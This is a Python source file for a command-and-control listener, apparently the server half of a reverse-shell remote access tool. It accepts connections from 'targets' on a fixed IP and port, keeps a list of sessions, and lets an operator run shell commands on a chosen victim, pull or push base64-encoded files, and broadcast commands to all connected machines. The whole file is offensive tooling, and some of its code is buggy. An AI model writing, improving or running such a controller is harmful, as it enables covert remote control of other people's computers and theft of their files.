import socket
import json
import os
import base64
import threading

def send_all(target,data):
    json_data = data
    target.sendall(json_data)


def shell(target,ip):
    def reliable_send(data):
        json_data = data
        print(json_data)
        target.sendall(json_data.encode())

    def reliable_recv():
        data=""
        cter=True
        while cter:
            try:
                print("Recieving")
                new_recv = target.recv(1024)
                print(new_recv.decode())
                data += new_recv.decode() 
                if(not new_recv or len(new_recv.decode()) < 1024 ):
                    cter=False
                    break
                print(data)
            except ValueError as e:
                print(e)
                break
        print("end of reliable recv")
        return data

    while True:

        command = input("Shell#~%s"%str(ip))
        print("before reliable send command")
        reliable_send(command)
        print("After rel send")
        if command == 'q':
            break
        elif command == "exit":
            target.close()
            targets.remove(target)
            ips.remove(ip)
            break
        elif command[:2] == "cd" and len(command)>1:
            continue
        elif command[:8] == "download":
            with open(command[9:]+"_copy","wb") as file:
                file_data = reliable_recv()
                file.write(base64.b64decode(file_data))
        elif command[:6] == "upload":
            try:
                with open(command[:7],"rb") as fin:
                    reliable_send(base64.b64encode(fin.read()))
            except:
                failed = "Failed to open"
                reliable_send(base64.b64encode(failed))
        else:
            message = reliable_recv()
            print(message)



def server():
    global clients
    while True:
        if stop_threads:
            break
        s.settimeout(1)
        try:
            target,ip = s.accept()
            targets.append(target)
            ips.append(ip[0])
			#print(str(targets[clients]) + "..."+str(ips[clients])+"has connected")
            print(str(ips[clients])+"has connected")
            clients +=1
        except:
            pass




global s
ips =[]
targets =[]

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)

s.bind(("172.17.229.88",54321))
s.listen(5)

clients = 0
stop_threads = False
print("[+] waiting for target to connect")
t1 = threading.Thread(target = server)
t1.start()

while True:
    command = input("Center: ")
    if command == "targets":
        count =0
        for ip in ips:
            print("session" + str(count) + "<--->"+str(ip))
            count +=1
    elif command[:7] == "session":
        num = int(command[8:])
        tarnum = targets[num]
        tarip = ips[num]
        shell(tarnum,tarip)
		# except Exception as e:
		# 	print("[+]No session with that IP :exception",e)
    elif command =="exit":
        for target in targets:
            target.close()
        s.close()
        stop_threads = True
        t1.join()
        break
    elif command[:7] == "sendall":
        length_of_targets = len(targets)
        i =0
        try:
            while i<length_of_targets:
                tarnumber = targets[i]
                print(tarnumber)
                send_all(tarnumber,command)
                i +=1
        except:
            print("cant send to all")